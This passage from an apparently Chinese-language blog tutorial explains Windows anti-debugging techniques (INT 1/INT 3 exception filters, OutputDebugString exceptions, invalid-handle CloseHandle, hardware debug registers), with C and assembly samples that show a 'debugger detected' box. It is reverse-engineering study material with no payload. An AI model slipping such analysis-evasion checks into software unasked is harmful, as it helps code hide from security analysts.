&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionRecord&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionCode&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">EXCEPTION_SINGLE_STEP&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// handle single step exception if not handled by debugger
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">VEH_INT1_isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_EXECUTION&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_SEARCH&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_VEH_INT1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">VEH_INT1_isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">SetUnhandledExceptionFilter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">VEH_INT1_UnhandledExceptionFilter&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// https://docs.microsoft.com/zh-cn/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler?redirectedfrom=MSDN
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pvectored_exception_handler
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">RaiseInt1&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">VEH_INT1_isDebuggerPresent&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;VEH INT1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用 &lt;code>SetUnhandledExceptionFilter&lt;/code> 实现，文档链接在注释里给出了。也可以再罗嗦一点，结合 &lt;code>AddVectoredExceptionHandler&lt;/code> 实现。但逻辑还是那样。&lt;/p>
&lt;p>INT 1中断方式检测调试器后，可以恢复到正常控制流执行。但是 INT 3 会有所区别，INT 3 中断时 EIP 会停留在中断指令处，中断处理中需要修改 EIP 的值恢复控制流。&lt;/p>
&lt;p>关于 SEH 中断反调试我留个链接：&lt;a class="link" href="https://bbs.pediy.com/thread-267324.htm" target="_blank" rel="noopener"
>看雪论坛：基于SEH的静态反调试实例分析&lt;/a>，有空再分析看看。&lt;/p>
&lt;h3 id="32-int-3">3.2 INT 3&lt;/h3>
&lt;p>INT 3 中断就是 &lt;code>0xcc&lt;/code> 一字节中断指令，顺便一提啊，因为VC会用 0xcc 填充未初始化的栈，用C写过代码多少都见过的 &lt;em>烫烫烫&lt;/em> 错误就是来自于此。&lt;/p>
&lt;p>参考 &lt;a class="link" href="https://ctf-wiki.org/reverse/windows/anti-debug/int-3/" target="_blank" rel="noopener"
>CTF Wiki - Interrupt 3&lt;/a>。&lt;/p>
&lt;blockquote>
&lt;p>当&lt;code>EXCEPTION_BREAKPOINT(0x80000003)&lt;/code>异常触发时, Windows 会认定这是由单字节的 &amp;ldquo;&lt;code>CC&lt;/code>&amp;rdquo; 操作码 (也即&lt;code>Int 3&lt;/code>指令) 造成的. Windows 递减异常地址以指向所认定的 &amp;ldquo;&lt;code>CC&lt;/code>&amp;rdquo; 操作码, 随后传递该异常给异常处理句柄. 但是 EIP 寄存器的值并不会发生变化.&lt;/p>
&lt;p>因此, 如果使用了 &lt;code>CD 03&lt;/code>（这是 &lt;code>Int 03&lt;/code> 的机器码表示），那么当异常处理句柄接受控制时, 异常地址是指向 &lt;code>03&lt;/code> 的位置.&lt;/p>
&lt;/blockquote>
&lt;p>这里有一个调试中发现的怪异问题：调试器内运行时会平栈错误，esp 会越过原本的返回地址，导致执行到 ret 时返回地址是0，产生异常。目前不确定是不是因为上面说的EIP没有+1导致的问题。&lt;/p>
&lt;p>案例代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">section&lt;/span> &lt;span class="no">.text&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">_RaiseInt3&lt;/span>
&lt;span class="nl">_RaiseInt3:&lt;/span>
&lt;span class="nf">int&lt;/span> &lt;span class="mi">3&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">BOOL&lt;/span> &lt;span class="k">volatile&lt;/span> &lt;span class="n">VEH_INT3_isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LONG&lt;/span> &lt;span class="n">CALLBACK&lt;/span> &lt;span class="nf">VEH_INT3_UnhandledExceptionFilter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_In_&lt;/span> &lt;span class="n">EXCEPTION_POINTERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionRecord&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionCode&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">EXCEPTION_BREAKPOINT&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// handle single step exception if not handled by debugger
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">VEH_INT3_isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">lpEP&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ContextRecord&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">Eip&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_EXECUTION&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_SEARCH&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_VEH_INT3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">VEH_INT3_isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">SetUnhandledExceptionFilter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">VEH_INT3_UnhandledExceptionFilter&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">RaiseInt3&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">VEH_INT3_isDebuggerPresent&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;SEH INT3&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到和 INT1 的案例别无二致。这里再附带上汇编结果，大佬也可以看看上面说的平栈问题是怎么回事。编译好的案例会附在最末。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x1C&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ds&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="mi">0x5B4000&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0x1&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ss&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="err">&amp;lt;&lt;/span>&lt;span class="no">packed.sub_5B1390&lt;/span>&lt;span class="err">&amp;gt;&lt;/span>
&lt;span class="nf">call&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ds&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="err">&amp;lt;&amp;amp;&lt;/span>&lt;span class="no">_SetUnhandledExceptionFilterStub@4&lt;/span>&lt;span class="err">&amp;gt;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x4&lt;/span>
&lt;span class="nf">call&lt;/span> &lt;span class="no">packed.5B1AA1&lt;/span> &lt;span class="c">; int3, retn
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ds&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="mi">0x5B4000&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">cmp&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x1&lt;/span>
&lt;span class="nf">je&lt;/span> &lt;span class="no">packed.5B1650&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x1C&lt;/span>
&lt;span class="nf">ret&lt;/span>
&lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ss&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0xC&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0x0&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ss&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0x8&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">packed.5B20A1&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ss&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0x4&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">packed.5B202A&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ss&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0x0&lt;/span>
&lt;span class="nf">call&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ds&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="err">&amp;lt;&amp;amp;&lt;/span>&lt;span class="no">MessageBoxA&lt;/span>&lt;span class="err">&amp;gt;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x10&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x1C&lt;/span>
&lt;span class="nf">ret&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="33-debugoutputstring">3.3 DebugOutputString&lt;/h3>
&lt;p>利用方式和前面一样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// TODO: NOT WORK
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="n">BOOL&lt;/span> &lt;span class="n">VEH_OutputDebugStringException_isDebugPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LONG&lt;/span> &lt;span class="n">CALLBACK&lt;/span> &lt;span class="nf">VEH_OutputDebugStringException_UnhandledExceptionFilter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_In_&lt;/span> &lt;span class="n">EXCEPTION_POINTERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionRecord&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionCode&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">EXCEPTION_BREAKPOINT&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// handle single step exception if not handled by debugger
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">VEH_INT3_isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_EXECUTION&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_SEARCH&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_VEH_OutputDebugException&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ULONG_PTR&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
&lt;span class="n">args&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ULONG_PTR&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">wcslen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">L&lt;/span>&lt;span class="s">&amp;#34;debug&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">args&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ULONG_PTR&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="sa">L&lt;/span>&lt;span class="s">&amp;#34;debug&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">AddVectoredExceptionHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">VEH_OutputDebugStringException_UnhandledExceptionFilter&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">VEH_OutputDebugStringException_isDebugPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">RaiseException&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DBG_PRINTEXCEPTION_WIDE_C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">RemoveVectoredExceptionHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">VEH_OutputDebugStringException_UnhandledExceptionFilter&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">VEH_OutputDebugStringException_isDebugPresent&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;OutputDebugString&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>实测发现 x32dbg 并不会处理 &lt;code>DBG_PRINTEXCEPTION_WIDE_C&lt;/code> ，所以这个反调试对 x32dbg 没用。&lt;/p>
&lt;h3 id="34-invalid_handle">3.4 INVALID_HANDLE&lt;/h3>
&lt;p>根据微软的文档 &lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle" target="_blank" rel="noopener"
>CloseHandle function (handleapi.h)&lt;/a> 说明：&lt;/p>
&lt;blockquote>
&lt;p>If the application is running under a debugger, the function will throw an exception if it receives either a handle value that is not valid or a pseudo-handle value. This can happen if you close a handle twice, or if you call &lt;strong>CloseHandle&lt;/strong> on a handle returned by the &lt;a class="link" href="https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea" target="_blank" rel="noopener"
>FindFirstFile&lt;/a> function instead of calling the &lt;a class="link" href="https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findclose" target="_blank" rel="noopener"
>FindClose&lt;/a> function.&lt;/p>
&lt;/blockquote>
&lt;p>可以得知，在调试器启动时，&lt;code>CloseHandle&lt;/code> 关闭无效的 &lt;code>HANDLE&lt;/code> 时会出现 &lt;code>EXCEPTION_INVALID_HANDLE&lt;/code> 异常。所以只要故意关闭一个无效的 &lt;code>HANDLE&lt;/code>，抓住这个异常，就能确定调试器存在。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">LONG&lt;/span> &lt;span class="n">CALLBACK&lt;/span> &lt;span class="nf">VEH_INVALID_HANDLE_UnhandledExceptionFilter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_In_&lt;/span> &lt;span class="n">EXCEPTION_POINTERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionRecord&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">ExceptionCode&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">EXCEPTION_INVALID_HANDLE&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// if debug present
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;INVALID HANDLE&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_EXECUTION&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_SEARCH&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_VEH_INVALID_HANDLE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">AddVectoredExceptionHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">VEH_INVALID_HANDLE_UnhandledExceptionFilter&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">CloseHandle&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">HANDLE&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0xBAAD&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">RemoveVectoredExceptionHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">VEH_INVALID_HANDLE_UnhandledExceptionFilter&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>和之前的检查不同，INVALID_HANDLE 是 &lt;strong>出现这个异常才存在调试器&lt;/strong>，之前的异常处理方式都是没出现异常才存在调试器。&lt;/p>
&lt;h2 id="0x04-硬件断点">0x04 硬件断点&lt;/h2>
&lt;p>&lt;a class="link" href="https://en.wikipedia.org/wiki/X86_debug_register" target="_blank" rel="noopener"
>x86 体系上存在一套调试寄存器&lt;/a>，就是 &lt;code>dr0&lt;/code>-&lt;code>dr7&lt;/code>这8个寄存器。其中&lt;code>dr0&lt;/code>-&lt;code>dr3&lt;/code>保存的硬件断点的线性地址，断点条件保存在&lt;code>dr7&lt;/code>寄存器。&lt;code>dr6&lt;/code>寄存器保存的是调试状态，指示触发了哪个断点条件。&lt;/p>
&lt;p>所以发现硬件断点的存在，就可以百分百确定正在被调试。&lt;/p>
&lt;h3 id="41-硬件断点">4.1 硬件断点&lt;/h3>
&lt;p>直接给案例代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// detect hardware breakpoint
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_DebugRegister&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">CONTEXT&lt;/span> &lt;span class="n">ctx&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ContextFlags&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">CONTEXT_DEBUG_REGISTERS&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">GetThreadContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetCurrentThread&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ctx&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Dr0&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Dr1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Dr2&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Dr3&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Dr0-Dr3&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过&lt;code>GetThreadContext&lt;/code>这个接口获得当前寄存器状态，当然也可以通过内联汇编来实现。当发现四个断点寄存器非零就可以确定正在被调试了。&lt;/p>
&lt;h2 id="0x05-完整性校验">0x05 完整性校验&lt;/h2>
&lt;p>完整性校验反调试的原理是检测 &lt;code>0xCC&lt;/code> 软件断点，当我们一般说的在程序里&lt;em>下断点&lt;/em>的时候下的是软件断点，实现的原理是调试器在这个内存位置上临时放一个&lt;code>0xcc&lt;/code>占位，当EIP走到这里时会触发一个INT 3中断，调试器趁机取得控制权。同时因为 INT 3 断点不会把 EIP + 1，所以调试器只需要把改成 &lt;code>0xcc&lt;/code> 的地方改回去，就可以让程序继续跑而无需去碰寄存器。&lt;/p>
&lt;h3 id="51-softwarebreakpoint">5.1 SoftwareBreakpoint&lt;/h3>
&lt;p>下面的案例给了一个简单的软件断点检测，只能检测到下在函数开头的软件断点。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// detect 0xcc interrupt code
